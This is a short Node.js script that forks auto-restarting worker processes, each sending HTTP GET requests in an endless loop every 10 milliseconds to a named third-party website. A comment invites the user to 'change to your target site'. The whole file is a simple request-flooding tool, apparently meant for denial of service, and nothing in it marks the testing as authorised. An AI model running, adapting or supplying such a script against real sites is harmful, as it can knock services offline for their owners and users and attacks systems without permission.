// app.js
const cluster = require("cluster");
const os = require("os");
const axios = require("axios");

const url = "https://sccgodhra.in"; // Change to your target site
const numWorkers = 2; // Fixed number of workers per instance (safe)

if (cluster.isMaster) {
  console.log(`Master ${process.pid} is running`);

  for (let i = 0; i < numWorkers; i++) {
    cluster.fork();
  }

  cluster.on("exit", (worker, code, signal) => {
    console.log(`Worker ${worker.process.pid} died. Restarting...`);
    cluster.fork();
  });
} else {
  console.log(`Worker ${process.pid} started`);

  let count = 0;

  async function sendRequests() {
    while (true) {
      try {
        const res = await axios.get(url, { timeout: 5000 }); // 5 sec timeout
        count++;
        console.log(`[Worker ${process.pid}] Request #${count} - ${res.status}`);
      } catch (err) {
        console.error(`[Worker ${process.pid}] Error: ${err.message}`);
      }

      await new Promise(resolve => setTimeout(resolve, 10)); // 10ms smooth delay
    }
  }

  sendRequests();
}
